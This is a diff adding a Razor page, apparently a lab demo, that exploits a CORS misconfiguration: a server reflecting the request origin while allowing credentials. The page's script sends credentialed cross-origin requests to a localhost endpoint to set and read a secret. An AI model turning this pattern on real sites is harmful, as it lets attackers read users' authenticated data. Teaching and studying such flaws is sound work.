@@ -1,0 +1,43 @@
+﻿@page
+@model PrivacyModel
+@{
+    ViewData["Title"] = "Exploit";
+}
+<h1>@ViewData["Title"]</h1>
+
+<div class="text-center">
+    <h1 class="display-4">Exploit</h1>
+    <div class="container mt-5 flex gap-3">
+        <p>Допустим сервер копирует принимаемый источник и выставляет его в AllowOrigin. А также разрешает Credentials
+        </p>
+        <button id="exploitSet" class="btn btn-primary">Set secret</button>
+        <button id="exploitGet" class="btn btn-primary">Get secret</button>
+    </div>
+</div>
+
+<script>
+    document.getElementById('exploitSet').addEventListener('click', function ()
+    {
+        fetch(
+            'http://localhost:5000/exploit/set',
+            {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'X-Custom-Header': 'application/json'
+                }
+            }
+        ).then(resp => resp.text()).then(resp => alert(resp));
+    })
+
+    document.getElementById('exploitGet').addEventListener('click', function ()
+    {
+        fetch('http://localhost:5000/exploit/get', {
+            method: 'GET',
+            credentials: 'include',
+            headers: {
+                'X-Custom-Header': 'application/json'
+            }
+        }).then(resp => resp.text()).then(resp => alert(resp));
+    })
+</script>
